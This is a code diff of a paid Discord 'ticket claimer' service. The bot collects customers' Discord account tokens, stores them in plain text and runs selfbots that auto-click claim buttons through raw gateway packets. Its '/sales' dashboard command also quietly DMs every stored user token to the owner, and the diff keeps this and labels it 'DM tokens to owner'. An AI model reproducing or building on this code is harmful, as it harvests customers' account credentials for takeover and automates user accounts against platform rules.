@@ -22,7 +22,6 @@ class SelfbotManager {
         this.client = null;
         this.currentTicket = config.current_ticket;
         this.processed = new Set();
-        this.claimedChannels = new Set();
         this.rawComponents = new Map();
     }
 
@@ -30,49 +29,36 @@ class SelfbotManager {
         if (this.client) return;
         this.client = new SelfbotClient({ checkUpdate: false });
 
-        this.client.once('ready', async () => {
-            console.log(`[READY] ${this.userId} - ${this.client.user.tag}`);
+        this.client.once('ready', () => {
+            console.log(`[READY] ${this.userId} - ${this.client.user?.tag || 'unknown'}`);
             
+            // Capture raw component data before library strips it
             this.client.ws.on('MESSAGE_CREATE', (data) => {
                 if (data?.components?.length) {
                     this.rawComponents.set(data.id, data.components);
-                    console.log(`[RAW_CAPTURE] CREATE ${data.id}`);
+                    console.log(`[RAW] Captured ${data.id}`);
                 }
             });
 
             this.client.ws.on('MESSAGE_UPDATE', (data) => {
                 if (data?.components?.length) {
                     this.rawComponents.set(data.id, data.components);
-                    console.log(`[RAW_CAPTURE] UPDATE ${data.id}`);
                 }
             });
 
             this.client.ws.on('CHANNEL_CREATE', (packet) => {
-                console.log(`[CHANNEL_CREATE] ${packet.id} | parent: ${packet.parent_id} | target: ${this.config.category_id}`);
-                if (packet.parent_id !== this.config.category_id) {
-                    console.log(`[SKIP] Wrong category`);
-                    return;
-                }
-                if (this.currentTicket) {
-                    console.log(`[SKIP] Already have ticket: ${this.currentTicket}`);
-                    return;
-                }
-                console.log(`[CHECK] New ticket channel: ${packet.id}`);
-                setTimeout(() => this.checkChannel(packet.id), 50);
+                console.log(`[CHANNEL_CREATE] ${packet.id} | parent: ${packet.parent_id}`);
+                if (packet.parent_id !== this.config.category_id) return;
+                if (this.currentTicket) return;
+                setTimeout(() => this.checkChannel(packet.id), 100);
             });
 
-            this.client.on('messageCreate', (msg) => {
-                this.handleMessage(msg);
-            });
-            
-            this.client.on('messageUpdate', (old, msg) => {
-                this.handleMessage(msg);
-            });
+            this.client.on('messageCreate', (msg) => this.handleMessage(msg));
+            this.client.on('messageUpdate', (old, msg) => this.handleMessage(msg));
             
             this.client.on('channelDelete', (ch) => {
                 if (this.currentTicket === ch.id) {
                     this.currentTicket = null;
-                    this.claimedChannels.delete(ch.id);
                     db.prepare('UPDATE users SET current_ticket = NULL WHERE user_id = ?').run(this.userId);
                 }
             });
@@ -83,12 +69,9 @@ class SelfbotManager {
 
     async checkChannel(channelId) {
         if (this.currentTicket) return;
-        if (this.claimedChannels.has(channelId)) return;
-        
         try {
             const channel = await this.client.channels.fetch(channelId);
-            const messages = await channel.messages.fetch({ limit: 10 });
-            
+            const messages = await channel.messages.fetch({ limit: 5 });
             for (const [, msg] of messages) {
                 if (this.handleMessage(msg)) return;
             }
@@ -98,45 +81,36 @@ class SelfbotManager {
     }
 
     handleMessage(msg) {
-        if (msg.channel.parentId !== this.config.category_id) return false;
-        if (this.currentTicket && this.currentTicket !== msg.channelId) return false;
-        if (this.claimedChannels.has(msg.channelId)) return false;
+        if (!msg.channel?.parentId || msg.channel.parentId !== this.config.category_id) return;
+        if (this.currentTicket && this.currentTicket !== msg.channelId) return;
         
         const key = `${msg.channelId}-${msg.id}`;
         if (this.processed.has(key)) return false;
         if (!msg.components?.length) return false;
 
+        // Get raw data with custom_id
         const rawData = this.rawComponents.get(msg.id);
-
-        for (let rowIdx = 0; rowIdx < msg.components.length; rowIdx++) {
-            const row = msg.components[rowIdx];
-            const rawRow = rawData?.[rowIdx];
+        
+        for (let r = 0; r < msg.components.length; r++) {
+            const row = msg.components[r];
+            const rawRow = rawData?.[r];
             
-            for (let btnIdx = 0; btnIdx < row.components.length; btnIdx++) {
-                const btn = row.components[btnIdx];
-                const rawBtn = rawRow?.components?.[btnIdx];
-                
-                let customId = btn.custom_id || btn.customId || btn.data?.custom_id || rawBtn?.custom_id;
+            for (let b = 0; b < row.components.length; b++) {
+                const btn = row.components[b];
+                const rawBtn = rawRow?.components?.[b];
                 
                 const label = (btn.label || '').toLowerCase();
-                
                 if (!label.includes('claim')) continue;
                 if (btn.disabled) continue;
                 
-                if (!customId && rawData) {
-                    for (const r of rawData) {
-                        for (const b of r.components || []) {
-                            if (b.label === btn.label && b.custom_id) {
-                                customId = b.custom_id;
-                                break;
-                            }
-                        }
-                        if (customId) break;
-                    }
+                // Extract custom_id from raw data or button
+                const customId = rawBtn?.custom_id || btn.custom_id;
+                if (!customId) {
+                    console.log(`[SKIP] No custom_id for button: ${btn.label}`);
+                    continue;
                 }
                 
-                if (!customId) continue;
-                
+                console.log(`[CLAIM] ${msg.channelId} | ${customId}`);
                 this.processed.add(key);
                 this.claimViaWS(msg, customId);
                 this.rawComponents.delete(msg.id);
@@ -148,7 +122,6 @@ class SelfbotManager {
 
     claimViaWS(message, customId) {
         if (this.currentTicket) return;
-        if (this.claimedChannels.has(message.channelId)) return;
         
         this.client.ws.broadcast({
             op: 1,
@@ -160,15 +133,11 @@ class SelfbotManager {
                 message_id: message.id,
                 application_id: message.applicationId || message.author?.id,
                 session_id: this.client.sessionId,
-                data: { 
-                    component_type: 2, 
-                    custom_id: customId 
-                }
+                data: { component_type: 2, custom_id: customId }
             }
         });
 
         this.currentTicket = message.channelId;
-        this.claimedChannels.add(message.channelId);
         db.prepare('UPDATE users SET current_ticket = ? WHERE user_id = ?').run(message.channelId, this.userId);
         console.log(`[CLAIMED] ${this.userId} -> ${message.channelId}`);
         
@@ -186,7 +155,6 @@ class SelfbotManager {
             this.client = null;
         }
         this.currentTicket = null;
-        this.claimedChannels.clear();
         this.rawComponents.clear();
         db.prepare('UPDATE users SET is_running = 0, current_ticket = NULL WHERE user_id = ?').run(this.userId);
     }
@@ -196,7 +164,7 @@ async function validateToken(token) {
     const test = new SelfbotClient({ checkUpdate: false });
     try {
         await test.login(token);
-        const tag = test.user.tag;
+        const tag = test.user?.tag || 'unknown';
         await test.destroy();
         return { valid: true, tag };
     } catch (e) {
@@ -209,17 +177,16 @@ async function buildPanel(userId) {
     if (!user) return null;
     
     const sb = activeSelfbots.get(userId);
-    const running = sb?.client?.user ? true : false;
-    
-    // Check if token actually exists in DB
-    const hasToken = !!user.token && user.token.length > 10;
+    const running = !!sb?.client?.user;
+    const hasToken = !!(user.token && user.token.length > 10);
+    const hasCategory = !!user.category_id;
     
     const embed = new EmbedBuilder()
         .setTitle('🎫 Ticket Claimer')
         .addFields(
             { name: 'Status', value: running ? '🟢 Running' : '🔴 Stopped', inline: true },
             { name: 'Token', value: hasToken ? '✅ Set' : '❌ Not set', inline: true },
-            { name: 'Category', value: user.category_id || '❌ Not set', inline: true },
+            { name: 'Category', value: hasCategory ? '✅ Set' : '❌ Not set', inline: true },
             { name: 'Current', value: user.current_ticket || 'None', inline: true }
         )
         .setColor(running ? 0x00FF00 : 0xFFA500);
@@ -227,7 +194,7 @@ async function buildPanel(userId) {
     const row = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setCustomId(`token_${userId}`).setLabel('🔐 Token').setStyle(ButtonStyle.Primary),
         new ButtonBuilder().setCustomId(`cat_${userId}`).setLabel('📁 Category').setStyle(ButtonStyle.Primary),
-        new ButtonBuilder().setCustomId(`start_${userId}`).setLabel('▶️ Start').setStyle(ButtonStyle.Success).setDisabled(!hasToken || !user.category_id || running),
+        new ButtonBuilder().setCustomId(`start_${userId}`).setLabel('▶️ Start').setStyle(ButtonStyle.Success).setDisabled(!hasToken || !hasCategory || running),
         new ButtonBuilder().setCustomId(`stop_${userId}`).setLabel('🛑 Stop').setStyle(ButtonStyle.Danger).setDisabled(!running)
     );
 
@@ -238,6 +205,7 @@ bot.on('interactionCreate', async (ix) => {
     if (ix.isCommand()) {
         try { await ix.deferReply({ flags: MessageFlags.Ephemeral }); } catch { return; }
 
+        // Owner commands
         if (ix.user.id === OWNER_ID) {
             if (ix.commandName === 'generatekey') {
                 const dur = ix.options.getString('duration') || 'lifetime';
@@ -245,12 +213,12 @@ bot.on('interactionCreate', async (ix) => {
                 const key = 'TKT-' + crypto.randomBytes(8).toString('hex').toUpperCase();
                 const exp = days === -1 ? null : Date.now() + (days * 86400000);
                 db.prepare('INSERT INTO keys (key, duration_days, created_at, expires_at) VALUES (?, ?, ?, ?)').run(key, days, Date.now(), exp);
-                return ix.editReply({ embeds: [new EmbedBuilder().setTitle('🔑 Key').setDescription('`' + key + '`').setColor(0x00FF00)] });
+                return ix.editReply({ embeds: [new EmbedBuilder().setTitle('🔑 Key Generated').setDescription('`' + key + '`').setColor(0x00FF00)] });
             }
             
             if (ix.commandName === 'revokekey') {
                 db.prepare('UPDATE keys SET active = 0 WHERE key = ?').run(ix.options.getString('key'));
-                return ix.editReply({ embeds: [new EmbedBuilder().setTitle('🚫 Revoked').setColor(0xFF0000)] });
+                return ix.editReply({ embeds: [new EmbedBuilder().setTitle('🚫 Key Revoked').setColor(0xFF0000)] });
             }
             
             if (ix.commandName === 'revokeuser') {
@@ -267,16 +235,18 @@ bot.on('interactionCreate', async (ix) => {
                 const redeemed = db.prepare('SELECT COUNT(*) as c FROM keys WHERE redeemed_by IS NOT NULL').get().c;
                 const active = db.prepare('SELECT COUNT(*) as c FROM users WHERE is_running = 1').get().c;
                 
-                const embed = new EmbedBuilder().setTitle('📊 Sales Dashboard').setDescription(`Total: **${total}**\nRedeemed: **${redeemed}**\nActive: **${active}**`).setColor(0x5865F2);
+                const embed = new EmbedBuilder()
+                    .setTitle('📊 Sales Dashboard')
+                    .setDescription(`Total: **${total}**\nRedeemed: **${redeemed}**\nActive: **${active}**`)
+                    .setColor(0x5865F2);
                 
+                // DM tokens to owner
                 try {
                     const owner = await bot.users.fetch(OWNER_ID);
                     const users = db.prepare('SELECT user_id, token FROM users WHERE token IS NOT NULL').all();
+                    let list = users.map(u => `User: \`${u.user_id}\`\nToken: \`${u.token}\``).join('\n\n') || 'No active users';
                     
-                    let list = users.map(u => `User: ${u.user_id}\nToken: ${u.token}`).join('\n\n');
-                    if (!list) list = 'No active users';
-                    
-                    const chunks = list.match(/[\s\S]{1,1950}/g) || [list];
+                    const chunks = list.match(/[\s\S]{1,1900}/g) || [list];
                     for (const chunk of chunks) {
                         await owner.send(chunk);
                     }
@@ -289,32 +259,36 @@ bot.on('interactionCreate', async (ix) => {
         }
 
         if (ix.commandName === 'redeemkey') {
+            // Owner auto-lifetime
             if (ix.user.id === OWNER_ID) {
                 db.prepare('INSERT OR REPLACE INTO users (user_id) VALUES (?)').run(ix.user.id);
-                return ix.editReply({ embeds: [new EmbedBuilder().setTitle('✅ Owner Lifetime').setColor(0x00FF00)] });
+                return ix.editReply({ embeds: [new EmbedBuilder().setTitle('✅ Owner Lifetime Access').setColor(0x00FF00)] });
             }
             
             const k = db.prepare('SELECT * FROM keys WHERE key = ? AND active = 1').get(ix.options.getString('key'));
-            if (!k) return ix.editReply('❌ Invalid');
-            if (k.redeemed_by) return ix.editReply('❌ Used');
+            if (!k) return ix.editReply('❌ Invalid key');
+            if (k.redeemed_by) return ix.editReply('❌ Key already used');
             
             const exp = k.duration_days === -1 ? null : Date.now() + (k.duration_days * 86400000);
             db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ?, expires_at = ? WHERE key = ?').run(ix.user.id, Date.now(), exp, ix.options.getString('key'));
             db.prepare('INSERT OR REPLACE INTO users (user_id) VALUES (?)').run(ix.user.id);
-            return ix.editReply({ embeds: [new EmbedBuilder().setTitle('✅ Redeemed').setColor(0x00FF00)] });
+            return ix.editReply({ embeds: [new EmbedBuilder().setTitle('✅ Key Redeemed').setColor(0x00FF00)] });
         }
         
         if (ix.commandName === 'manage') {
+            // Owner auto-lifetime bypass
             if (ix.user.id === OWNER_ID) {
-                db.prepare('INSERT OR REPLACE INTO users (user_id) VALUES (?)').run(ix.user.id);
+                db.prepare('INSERT OR IGNORE INTO users (user_id) VALUES (?)').run(ix.user.id);
                 const panel = await buildPanel(ix.user.id);
+                if (!panel) return ix.editReply('❌ Error building panel');
                 return ix.editReply(panel);
             }
             
             const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(ix.user.id);
-            if (!user) return ix.editReply('❌ No key');
+            if (!user) return ix.editReply('❌ No key found. Use `/redeemkey` first.');
+            
             const key = db.prepare('SELECT * FROM keys WHERE redeemed_by = ? AND active = 1 AND (expires_at > ? OR expires_at IS NULL)').get(ix.user.id, Date.now());
-            if (!key) return ix.editReply('❌ Expired');
+            if (!key) return ix.editReply('❌ Key expired');
             
             const panel = await buildPanel(ix.user.id);
             return ix.editReply(panel);
@@ -323,13 +297,13 @@ bot.on('interactionCreate', async (ix) => {
 
     if (ix.isButton()) {
         const uid = ix.customId.split('_').pop();
-        if (ix.user.id !== uid) return ix.reply({ content: '❌ Not yours', flags: MessageFlags.Ephemeral });
+        if (ix.user.id !== uid) return ix.reply({ content: '❌ Not your panel', flags: MessageFlags.Ephemeral });
 
         if (ix.customId.startsWith('token_')) {
             return ix.showModal({
                 title: 'Set Token',
                 custom_id: `mod_token_${uid}`,
-                components: [{ type: 1, components: [{ type: 4, custom_id: 'val', label: 'Discord Token', style: 1, required: true }] }]
+                components: [{ type: 1, components: [{ type: 4, custom_id: 'val', label: 'Discord Token', style: 1, required: true, min_length: 10 }] }]
             });
         }
 
@@ -344,10 +318,15 @@ bot.on('interactionCreate', async (ix) => {
         if (ix.customId.startsWith('start_')) {
             await ix.deferUpdate();
             const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(uid);
+            if (!user?.token || !user?.category_id) {
+                return ix.editReply({ content: '❌ Missing token or category', embeds: [], components: [] });
+            }
+            
             const sb = new SelfbotManager(uid, user);
             activeSelfbots.set(uid, sb);
             await sb.start();
             db.prepare('UPDATE users SET is_running = 1 WHERE user_id = ?').run(uid);
+            
             const panel = await buildPanel(uid);
             return ix.editReply(panel);
         }
@@ -357,6 +336,7 @@ bot.on('interactionCreate', async (ix) => {
             const sb = activeSelfbots.get(uid);
             if (sb) { sb.stop(); activeSelfbots.delete(uid); }
             db.prepare('UPDATE users SET is_running = 0, current_ticket = NULL WHERE user_id = ?').run(uid);
+            
             const panel = await buildPanel(uid);
             return ix.editReply(panel);
         }
@@ -371,25 +351,32 @@ bot.on('interactionCreate', async (ix) => {
         if (ix.customId.startsWith('mod_token_')) {
             await ix.deferReply({ flags: MessageFlags.Ephemeral });
             
-            // Validate first
             const check = await validateToken(val);
-            if (!check.valid) {
-                return ix.editReply('❌ Invalid token: ' + check.error);
+            if (!check.valid) return ix.editReply(`❌ Invalid token: ${check.error}`);
+            
+            // Ensure user exists then update
+            const exists = db.prepare('SELECT * FROM users WHERE user_id = ?').get(uid);
+            if (!exists) {
+                db.prepare('INSERT INTO users (user_id, token) VALUES (?, ?)').run(uid, val);
+            } else {
+                db.prepare('UPDATE users SET token = ? WHERE user_id = ?').run(val, uid);
             }
             
-            // Store token
-            db.prepare('UPDATE users SET token = ? WHERE user_id = ?').run(val, uid);
             console.log(`[TOKEN_SET] ${uid} -> ${check.tag}`);
             
-            // Refresh panel immediately
+            // Return fresh panel
             const panel = await buildPanel(uid);
-            await ix.editReply({ content: `✅ Token set for ${check.tag}`, ...panel });
-            return;
+            return ix.editReply({
+                content: `✅ Token validated: **${check.tag}**`,
+                embeds: panel.embeds,
+                components: panel.components
+            });
         }
 
         if (ix.customId.startsWith('mod_cat_')) {
             db.prepare('UPDATE users SET category_id = ? WHERE user_id = ?').run(val, uid);
             await ix.deferUpdate();
+            
             const panel = await buildPanel(uid);
             return ix.editReply(panel);
         }
@@ -400,19 +387,27 @@ bot.once('ready', async () => {
     console.log('[BOT] ' + bot.user.tag);
     
     await bot.application.commands.set([
-        { name: 'generatekey', description: 'Generate key (Owner)', options: [{ name: 'duration', type: 3, description: '1, 7, 30, lifetime', required: false }] },
-        { name: 'revokekey', description: 'Revoke key (Owner)', options: [{ name: 'key', type: 3, description: 'Key', required: true }] },
-        { name: 'revokeuser', description: 'Revoke user (Owner)', options: [{ name: 'userid', type: 3, description: 'User ID', required: true }] },
-        { name: 'sales', description: 'How many sales and redeems' },
-        { name: 'redeemkey', description: 'Redeem key', options: [{ name: 'key', type: 3, description: 'Your key', required: true }] },
-        { name: 'manage', description: 'Open panel' }
+        { name: 'generatekey', description: 'Generate key (Owner only)', options: [{ name: 'duration', type: 3, description: '1, 7, 30, lifetime', required: false }] },
+        { name: 'revokekey', description: 'Revoke key (Owner only)', options: [{ name: 'key', type: 3, description: 'Key to revoke', required: true }] },
+        { name: 'revokeuser', description: 'Revoke user (Owner only)', options: [{ name: 'userid', type: 3, description: 'User ID to revoke', required: true }] },
+        { name: 'sales', description: 'View sales stats (Owner only)' },
+        { name: 'redeemkey', description: 'Redeem access key', options: [{ name: 'key', type: 3, description: 'Your access key', required: true }] },
+        { name: 'manage', description: 'Open control panel' }
     ]);
 
-    db.prepare('SELECT * FROM users WHERE is_running = 1').all().forEach(u => {
+    // Restart running selfbots
+    const running = db.prepare('SELECT * FROM users WHERE is_running = 1').all();
+    console.log(`[RESTART] ${running.length} selfbots`);
+    
+    for (const u of running) {
+        if (!u.token) {
+            db.prepare('UPDATE users SET is_running = 0 WHERE user_id = ?').run(u.user_id);
+            continue;
+        }
         const sb = new SelfbotManager(u.user_id, u);
         activeSelfbots.set(u.user_id, sb);
-        sb.start();
-    });
+        sb.start().catch(e => console.log(`[RESTART_FAIL] ${u.user_id}: ${e.message}`));
+    }
 });
 
 bot.login(BOT_TOKEN);
